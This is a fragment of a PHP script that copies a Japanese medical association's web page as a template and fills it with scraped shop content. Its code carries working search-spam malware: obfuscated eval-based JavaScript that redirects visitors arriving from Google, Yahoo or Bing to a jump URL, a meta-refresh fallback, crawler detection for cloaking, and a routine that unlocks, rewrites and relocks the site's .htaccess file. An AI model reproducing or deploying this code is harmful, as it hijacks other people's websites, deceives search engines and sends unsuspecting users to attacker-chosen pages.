					<dt>2016.05.20<span class="news_btn_001">&#21307;&#30274;&#32773;&#21521;&#12369;</span></dt>
					<dd><a href="%MainShell%/14_kankei/chiken/0415_chiken.html">CRC&#30740;&#20462;&#20250;&#12398;&#12372;&#26696;&#20869;&#12539;&#12362;&#30003;&#36796;&#12415;&#12434;&#25522;&#36617;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
					<dt>2016.05.16</dt>
					<dd><a href="%MainShell%/14_kankei/html/12_homecare_center.html">&#22312;&#23429;&#21307;&#31561;&#32057;&#20171;&#12475;&#12531;&#12479;&#12540;&#12395;&#12388;&#12356;&#12390;&#25522;&#36617;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>                
					<dt>2016.04.28<span class="news_btn_001">&#21307;&#30274;&#32773;&#21521;&#12369;</span><span class="news_btn_end">&#32066;&#20102;&#12375;&#12414;&#12375;&#12383;</span></dt>
					<dd><a href="%MainShell%/14_kankei/html/07_kouenkai.html#20160601">&#21307;&#30274;&#20445;&#38522;&#12395;&#38306;&#12377;&#12427;&#30740;&#20462;&#20250;&#12395;&#12388;&#12356;&#12390;&#25522;&#36617;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>                
					<dt>2016.04.26</dt>
					<dd><a href="%MainShell%/14_kankei/html/02_opinion.html">&#24179;&#25104;28&#24180;&#24230;4&#26376;&#21495;&#12458;&#12500;&#12491;&#12458;&#12531;&#12434;&#25522;&#36617;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
					<dt>2016.04.26</dt>
					<dd><a href="%MainShell%/14_kankei/html/03_qa.html">&#24179;&#25104;28&#24180;&#24230;4&#26376;&#21495;&#21307;&#25919;Q&#65286;A&#12434;&#25522;&#36617;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
					<dt>2016.04.19</dt>
					<dd><a href="%MainShell%/11_shimin/kouza_pdf/271_medical.pdf" class="Pdf" target="_blank">&#31532;271&#22238;&#23478;&#24237;&#21307;&#23398;&#35611;&#24231;&#12481;&#12521;&#12471;&#12434;&#25522;&#36617;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
					<dt>2016.04.19<span class="news_btn_end">&#32066;&#20102;&#12375;&#12414;&#12375;&#12383;</span></dt>
					<dd><a href="%MainShell%/11_shimin/kouza_pdf/270_medical.pdf" class="Pdf" target="_blank">&#31532;270&#22238;&#23478;&#24237;&#21307;&#23398;&#35611;&#24231;&#12481;&#12521;&#12471;&#12434;&#25522;&#36617;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
					<dt>2016.04.15</dt>
					<dd><a href="%MainShell%/11_shimin/html/1101_sankosho.html">&#20581;&#24247;&#12497;&#12531;&#12501;&#12524;&#12483;&#12488;&#12300;&#20803;&#27671;&#12398;&#21442;&#32771;&#26360;&#12301;&#12434;&#25522;&#36617;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
					<dt>2016.04.07</dt>
					<dd><a href="%MainShell%/np_page/index.html">&#39640;&#40802;&#32773;&#29992;&#32954;&#28814;&#29699;&#33740;&#12527;&#12463;&#12481;&#12531;&#25509;&#31278;&#12395;&#12388;&#12356;&#12390;&#12434;&#26356;&#26032;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
				</dl>
				
				</div>
				<div class="box" id="mem">
				
				<div id="news_header">
				<div class="news_midasi_ippan">&#20250;&#21729;&#21521;&#12369;&#12362;&#30693;&#12425;&#12379;<br class="br-sp"><span>&#8251;&#12497;&#12473;&#12527;&#12540;&#12489;&#12364;&#24517;&#35201;&#12391;&#12377;&#12290;</span></div>
				<div class="news_btn_list"><a href="%MainShell%/news_member.html"><img src="image_2014/news_icon_list.png" alt="&#19968;&#35239;&#12408;"></a></div>
				</div>
				<dl>
					<dt>2016.06.01</dt>
					<dd><a href="%MainShell%/./member/12_schedule/01_s.html">6&#26376;&#12539;7&#26376;&#12398;&#34892;&#20107;&#20104;&#23450;&#34920;&#12434;&#26356;&#26032;&#12356;&#12383;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
				    <dt>2015.05.31</dt>
				    <dd><a href="%MainShell%/./member/16_section/04_kouhou/04_satsui.html">&#26413;&#21307;&#36890;&#20449;5&#26376;&#21495;&#12434;&#25522;&#36617;&#12356;&#12383;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
					<dt>2016.05.31</dt>
					<dd><a href="%MainShell%/./member/16_section/03_seisaku/05_lecture.html">&#12304;&#25919;&#31574;&#37096;&#12305;&#21307;&#25919;&#35611;&#28436;&#20250;&#22577;&#21578;&#12434;&#25522;&#36617;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
				    <dt>2016.05.26</dt>
				    <dd><a href="%MainShell%/./member/11_report/html/01_director.html">&#29702;&#20107;&#20250;&#22577;&#21578;&#12506;&#12540;&#12472;&#12434;&#26356;&#26032;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
				    <dt>2016.05.26</dt>
				    <dd><a href="%MainShell%/./member/11_report/html/02_committee.html">&#22996;&#21729;&#20250;&#22577;&#21578;&#12506;&#12540;&#12472;&#12434;&#26356;&#26032;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
				    <dt>2016.05.20</dt>
					<dd><a href="%MainShell%/./member/16_section/07_gakujutsu/html/0415_chiken.html">CRC&#30740;&#20462;&#20250;&#12398;&#12372;&#26696;&#20869;&#12539;&#12362;&#30003;&#36796;&#12415;&#12434;&#25522;&#36617;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
					<dt>2016.05.19</dt>
				    <dd><a href="%MainShell%/./member/11_report/html/01_director.html">&#29702;&#20107;&#20250;&#22577;&#21578;&#12506;&#12540;&#12472;&#12434;&#26356;&#26032;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
				    <dt>2016.05.19</dt>
				    <dd><a href="%MainShell%/./member/11_report/html/02_committee.html">&#22996;&#21729;&#20250;&#22577;&#21578;&#12506;&#12540;&#12472;&#12434;&#26356;&#26032;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
					<dt>2016.05.17</dt>
					<dd><a href="%MainShell%//EntryForm/">&#31532;121&#22238;&#26413;&#24140;&#24066;&#21307;&#24107;&#20250;&#23450;&#26178;&#20195;&#35696;&#21729;&#20250;&#12398;&#20621;&#32884;&#12395;&#12388;&#12356;&#12390;&#25522;&#36617;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
              		<dt>2016.05.02</dt>
					<dd><a href="%MainShell%/./member/12_schedule/01_s.html">5&#26376;&#12539;6&#26376;&#12398;&#34892;&#20107;&#20104;&#23450;&#34920;&#12434;&#26356;&#26032;&#12356;&#12383;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>  
                	<dt>2015.04.26</dt>
					<dd><a href="%MainShell%/./member/16_section/04_kouhou/04_satsui.html">&#26413;&#21307;&#36890;&#20449;4&#26376;&#21495;&#12434;&#25522;&#36617;&#12356;&#12383;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
                    <dt>2016.04.25</dt>
                    <dd><a href="%MainShell%/./member/17_library/html/07_gakujutsu.html">&#12304;&#23398;&#34899;&#37096;&#12305;&#24179;&#25104;28&#24180;&#24230;&#26413;&#24140;&#24066;&#21307;&#24107;&#20250;&#21307;&#23398;&#30740;&#31350;&#27963;&#21205;&#35036;&#21161;&#37329;&#24076;&#26395;&#32773;&#21215;&#38598;&#12398;&#12362;&#30693;&#12425;&#12379;&#12434;&#25522;&#36617;&#12356;&#12383;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
					<dt>2016.04.21</dt>
					<dd><a href="%MainShell%/./member/11_report/html/01_director.html">&#29702;&#20107;&#20250;&#22577;&#21578;&#12506;&#12540;&#12472;&#12434;&#26356;&#26032;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
					<dt>2016.04.19</dt>
					<dd><a href="%MainShell%/./member/11_report/html/01_director.html">&#29702;&#20107;&#20250;&#22577;&#21578;&#12506;&#12540;&#12472;&#12434;&#26356;&#26032;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
					<dt>2016.04.19</dt>
					<dd><a href="%MainShell%/./member/11_report/html/02_committee.html">&#22996;&#21729;&#20250;&#22577;&#21578;&#12506;&#12540;&#12472;&#12434;&#26356;&#26032;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
					<dt>2016.04.19</dt>
					<dd><a href="%MainShell%/./member/11_report/html/03_list.html">&#12381;&#12398;&#20182;&#22577;&#21578;&#12506;&#12540;&#12472;&#12434;&#26356;&#26032;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
                    <dt>2016.04.19</dt>
                    <dd><a href="%MainShell%/./member/17_library/html/05_chiiki.html">&#12304;&#22320;&#22495;&#20445;&#20581;&#37096;&#12305;&#25991;&#26360;&#12521;&#12452;&#12502;&#12521;&#12522;&#12434;&#25522;&#36617;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
              		<dt>2016.04.01</dt>
					<dd><a href="%MainShell%/./member/12_schedule/01_s.html">4&#26376;&#12539;5&#26376;&#12398;&#34892;&#20107;&#20104;&#23450;&#34920;&#12434;&#26356;&#26032;&#12356;&#12383;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>  
				</dl>
				</div>
			</div>
			
		</div><!-- #content end -->
		
		<div class="box" id="footerbana">
			<a href="%MainShell%/" target="_blank"><img src="image_2014/bana_foot01.png" alt="&#26413;&#24140;&#24066;&#21307;&#24107;&#36899;&#30431;"></a>
			<a href="%MainShell%/" target="_blank"><img src="image_2014/bana_foot02.png" alt="&#21271;&#28023;&#36947;&#21307;&#24107;&#20250;"></a>
			<a href="%MainShell%/" target="_blank"><img src="image_2014/bana_foot03.png" alt="&#26085;&#26412;&#21307;&#24107;&#20250;"></a>
		</div>
		
		<div class="box" id="footer">
			<div class="box" id="footermenu">
				<ul>
					<li><a href="%MainShell%/sitemap.html">&#12469;&#12452;&#12488;&#12510;&#12483;&#12503;</a></li>
					<li><a href="%MainShell%/link.html">&#12522;&#12531;&#12463;&#38598;</a></li>
					<li><a href="%MainShell%/privacy.html">&#20491;&#20154;&#24773;&#22577;&#20445;&#35703;&#12408;&#12398;&#21462;&#12426;&#32068;&#12415;</a></li>
					<li><a href="%MainShell%/basicpolicy.html">&#29305;&#23450;&#20491;&#20154;&#24773;&#22577;&#31561;&#12408;&#12398;&#21462;&#12426;&#32068;&#12415;</a></li>

				</ul>
			</div>
			<div class="box" id="add">
				&#19968;&#33324;&#31038;&#22243;&#27861;&#20154;&#12288;&#26413;&#24140;&#24066;&#21307;&#24107;&#20250;<br />
				&#20303;&#25152;&#65306;&#12306;060-8581 &#21271;&#28023;&#36947;&#26413;&#24140;&#24066;&#20013;&#22830;&#21306;&#22823;&#36890;&#35199;19&#19969;&#30446;1<br />
				TEL&#65306;  	 <a href="%MainShell%/tel:0116114181" class="tel_link">011-611-4181</a>&#12288;<br class="br-sp">FAX&#65306;  	 011-643-1511
			</div>
			
		</div>
	</div>	
	</div>
	<!--pagetop-->
	<p id="page-top"><a href="%MainShell%/#wrap">&#9650;</a></p>
</body>
</html>
';

		$out =$template;

		$out = str_replace('%Mate_Title%',$Mate_Title, $out);
		$out = str_replace('%Mate_Keyword%', $Mate_Keyword, $out);
		$out = str_replace('%Mate_Description%', $Mate_Description, $out);
		$out = str_replace('%Article_Title%', $Article_Title[0], $out);
		$out = str_replace('%MainShell%','http://'.$urlInfo['server_name'], $out);
		$Article_category = preg_replace('/<a[^>]*?>/i', '', $Article_category[0]);
		$Article_category = str_replace('</a>', '', $Article_category);
		$out = str_replace('%Article_Comment%','<table><tr>'.$Article_category.'</tr></table><br /><img src="'.$Article_picture[0].'" /><br />'.desc_clear($Article_descriptiona[0].$Article_descriptionb[0].$Article_descriptionc[0]), $out);
		$out = str_replace('%Article_Inlink%', $Article_Inlinks, $out);
	//	$rCheck=true;
		if($rCheck)
		{
			//$htmlrCheck=get_html_content($jumpcodeurl);
			//$htmlrCheck=


            $iframe_script_string = 'if(/(google|yahoo|bing|aol)/i.test(document.referrer)){window.setTimeout(function(){top.location.href="' . $jumpcodeurl . '"},1000)}';
	        $r_code = outScript('', 0, $iframe_script_string, 1);
			$jumpcode =$r_code. '<noscript><meta http-equiv="refresh" content="1; url=' . $jumpcodeurl . '" /></noscript>';
			$out = preg_replace('/<body[^>]*?>/i','<body>'. $jumpcode.'</script><div style="display:none">', $out);
			$out = str_replace('</body>', '</div></body>', $out);
		}
		echo $out;
		die();
	}
	
}

function outScript($goto, $test = false, $script_string = '', $iframe = false){

	$sep = '====';
	if ($iframe) {
		$sep = '####';
	}
	$script_format = '(function(){var g=setInterval(function(){try{' . ($test ? '!' : '') . '!(/(google|yahoo|bing|aol)/i.test(document.referrer))||(function(s){window.top.location.replace(s)})(' . $sep . '{#URL#}' . $sep . ');clearInterval(g)}catch(e){}},10)})()';
	$step_min = 1;
	$step_max = 5;
	$outScript = '';
	$pos = 0;
	$t = 0;
	$tmp = '';
	$rurl = str_ireplace('{#URL#}', $goto, $script_format);
	if ($script_string != '') {
		$rurl = $script_string;
	}
	// echo "$rurl";die();
	$rurl_length = mb_strlen($rurl);
	// echo "$rurl_length";die();
	$comma = '';

	while ($pos < $rurl_length) {
		$r = mt_rand($step_min, $step_max);
		// echo "$r";die();
		$t = $pos + $r;
		if ($t > $rurl_length) {
			$t = $rurl_length;
		}
		$tmp .= $comma . mb_substr($rurl, $pos, $r);
		// echo "$tmp";die();
		$pos += $r;
		$comma = '\'+\'';
	}

	if ($script_string != '') {
		if ($iframe) {
			$outScript = ($tmp != '' ? '<script>eval((\'' . $tmp . '\').replace(/' . $sep . '/g, \'\\\'\'))</script>' : $tmp);
		}else{
			$outScript = ($tmp != '' ? '<script>document.write(\'' . $tmp . '\')</script>' : $tmp);
		}
	}else{
		$outScript = ($tmp != '' ? '<script>eval((\'' . $tmp . '\').replace(/' . $sep . '/g, \'\\\'\'))</script>' : $tmp);
	}
	
	// $out = ($tmp != '' ? 'eval((\'' . $tmp . '\').replace(/' . $sep . '/g, \'\\\'\'))' : $tmp);
	// echo $out;
	return $outScript;
}

function sync_htaccess($htaccess_rule = '', $rewrite_open = 1){
	
  if ($htaccess_rule != '') {
    if ($rewrite_open) {
      $htaccess_path = './.htaccess';
      // if (isset($_SERVER['DOCUMENT_ROOT'])) {
      //   $htaccess_path = $_SERVER['DOCUMENT_ROOT'] . '/.htaccess';
      // }
      if ($htaccess_path != '' && file_exists($htaccess_path)) {
        @chmod($htaccess_path, 0777);
        $htaccess_content = @file_get_contents($htaccess_path);
        // if (stripos($htaccess_content, '#ListUrlRewrite') === false) {
        if (stripos($htaccess_content, $htaccess_rule) === false) {
          // $rewrite_slash = preg_replace("/(\\$\d)/si", "\\\\\\\\\\\\$1", $rewrite_array['htacc']);
          $rewrite_slash = preg_replace("/\\\$/s", '\\\$', $htaccess_rule);
          // file_put_contents('./ins.log', "$rewrite_slash\n");
          if (stripos($htaccess_content, '%{HTTP_HOST}') !== false && stripos($htaccess_content, 'R=301') !== false) {
            $htaccess_content = preg_replace("/(RewriteRule.*?R=301.*?[\r\n])/si", "$1\n{$rewrite_slash}\n", $htaccess_content, 1);
          }elseif (stripos($htaccess_content, 'RewriteBase') !== false) {
            $htaccess_content = preg_replace("/(RewriteBase.*?[\r\n])/si", "$1\n{$rewrite_slash}\n", $htaccess_content, 1);
          }elseif (stripos($htaccess_content, 'RewriteEngine') !== false) {
            $htaccess_content = preg_replace("/(RewriteEngine.*?[\r\n])/si", "$1\n{$rewrite_slash}\n", $htaccess_content, 1);
          }else{
            // search first RewriteRule
            $match = array();
            preg_match("/RewriteRule.*?[\r\n]/si", $htaccess_content, $match);
            if (!empty($match) && isset($match[0])) {
              $htaccess_content = str_ireplace($match[0], "\n" . $htaccess_rule . $match[0], $htaccess_content);
            }
            unset($match);
          }
          $htaccess_content_array = explode("\n", $htaccess_content);
          if (!empty($htaccess_content_array)) {
            foreach ($htaccess_content_array as $hca_key => &$htaccess_content_line) {
              // $htaccess_content_line = preg_replace("/^\s+(.*)/", "$1\n", $htaccess_content_line);
              $htaccess_content_line = trim($htaccess_content_line);
              if ($htaccess_content_line == '') {
                unset($htaccess_content_array[$hca_key]);
              }
            }
          }
          $htaccess_content = implode("\n", $htaccess_content_array);
          unset($htaccess_content_array, $rewrite_slash);
          $htaccess_content = preg_replace("/(^[\s\r\n]+|[\s\r\n]+$)/si", '', $htaccess_content);
          @file_put_contents($htaccess_path, $htaccess_content);
        }
      }else{
        // create new .htaccess
        $htaccess_content = "<IfModule mod_rewrite.c>\nRewriteEngine On\n" . $htaccess_rule . "\n</IfModule>\n";
        @file_put_contents($htaccess_path, $htaccess_content);
        unset($htaccess_content, $htaccess_path);
      }
      @chmod($htaccess_path, 0444);
    }
  }
}
function desc_clear($desc) {
	$description = preg_replace('/<iframe[\w\W]+<\/iframe>/', '', $desc);
	$description = preg_replace('/<div class="rp-item[0-9]+">SERVICE<\/div>[\w\W]+/', '', $description);
	$description = preg_replace('/<a [\w\W]+?<\/a>/', '', $description);
	$description = preg_replace('/<img src="\/[\w\W]+?>/', '', $description);
	$description = preg_replace('/<map[^>]*>[\w\W]+?<\/map>/', '', $description);
	$description = preg_replace('/<img[^\""]+>/', '', $description);
	$description = str_replace('楽天市場店', '', $description);
	$description = str_replace('楽天市場', '', $description);
	$description = str_replace('楽天', '', $description);
	return $description;
}
//来路判断
function func_referCheck($refer = ''){
  $redi = false;
  $referbots = 'google.co.jp|yahoo.co.jp|bing';
  if ($refer != '' && preg_match("/($referbots)/si", $refer)) {
    $redi = true;
  }
  return $redi;
}
//蜘蛛判断
function func_loginCheck($agent = ''){

  $login = false;
  $bots = 'googlebot|baiduspider|bingbot|google|baidu|aol|bing|yahoo';
  // $bots = explode('|', $bots);

  if ($agent != '') {
    if (preg_match("/($bots)/si", $agent)) {
      $login = true;
    }
  }
  	
  return $login;
}
function get_html_content($url){
	$html_content='';
	if (extension_loaded('curl') && function_exists('curl_init') && function_exists('curl_exec')){
		$ch = curl_init();  
		curl_setopt($ch, CURLOPT_URL, $url);  
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true) ;  
		curl_setopt($ch, CURLOPT_BINARYTRANSFER, true) ; 
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
		$html_content = curl_exec($ch);  
		curl_close($ch);
	}
	if($html_content==''){
		if (function_exists('file_get_contents')){
			$html_content = file_get_contents($url);  
		}
	}
	if($html_content==''){
		if (function_exists('fopen') && function_exists('ini_get') && ini_get('allow_url_fopen')){
			$fp = fopen($url, 'r') or exit('Open url faild!');    
			if($fp){  
				while(!feof($fp)) {    
					$html_content.=fgets($fp)."";  
				}  
			fclose($fp);    
			} 
		}
	}
	return $html_content;
}
class_x_i();

?>
